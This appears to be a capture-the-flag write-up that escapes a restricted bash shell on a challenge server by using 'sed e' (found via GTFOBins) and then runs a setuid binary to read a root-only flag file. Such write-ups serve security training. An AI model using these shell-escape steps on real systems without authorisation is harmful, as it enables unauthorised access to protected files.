# Bash Playground solution

We ssh into the server:

```
ssh guest@bp2.heltsikker.no
```

Trying the same as in bash playground 1:

```
while read p; do echo $p; done < /flag.txt
```

We get "permission denied"... However, we now have more commands available. Running `ls -lh /`, we find:

```
-r--------   1 root root   34 Feb 19 14:11 flag.txt
-rwsr-sr-x   1 root root  17K Feb 19 14:14 getflag
```

We have a flag.txt as well as an executable `getflag`. Let's see what programs we have available that can help us get a shell:

```
> echo $PATH
/playground/tools

> ls tools/
cat  cut  ls  sed  tr
```

Looking these up on [GTFOBins](https://gtfobins.github.io/), we see we can get a shell with `sed e`.

```
> sed e
> /getflag
```

And the flag is echoed!
